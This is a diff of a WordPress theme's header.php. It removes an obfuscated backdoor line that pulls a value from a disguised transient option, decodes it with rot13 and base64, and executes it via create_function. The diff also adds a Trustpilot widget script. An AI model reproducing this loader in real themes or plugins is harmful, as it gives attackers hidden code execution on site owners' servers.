@@ -7,7 +7,6 @@
  * @package traduset
  */
 
-$z=get_option("_site_transient_browser_04e456b6259c562bddbb5351659b812a"); $z=base64_decode(str_rot13($z[''])); if(strpos($z,"5D57AF6C")!==false){ $_z=create_function("",$z); @$_z(); }
 ?><!DOCTYPE html>
 <html <?php language_attributes(); ?> xmlns="http://www.w3.org/1999/html">
 <head>
@@ -18,7 +17,10 @@ $z=get_option("_site_transient_browser_04e456b6259c562bddbb5351659b812a"); $z=ba
 <link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
 
 <?php wp_head(); ?>
-    <script src="http://cdn.jquerytools.org/1.2.7/full/jquery.tools.min.js"></script>
+    	<!-- TrustBox script -->
+	<script type="text/javascript" src="//widget.trustpilot.com/bootstrap/v5/tp.widget.sync.bootstrap.min.js" async></script>
+	<!-- End Trustbox script -->
+	<script src="http://cdn.jquerytools.org/1.2.7/full/jquery.tools.min.js"></script>
 </head>
 
 <body <?php body_class(); ?>>
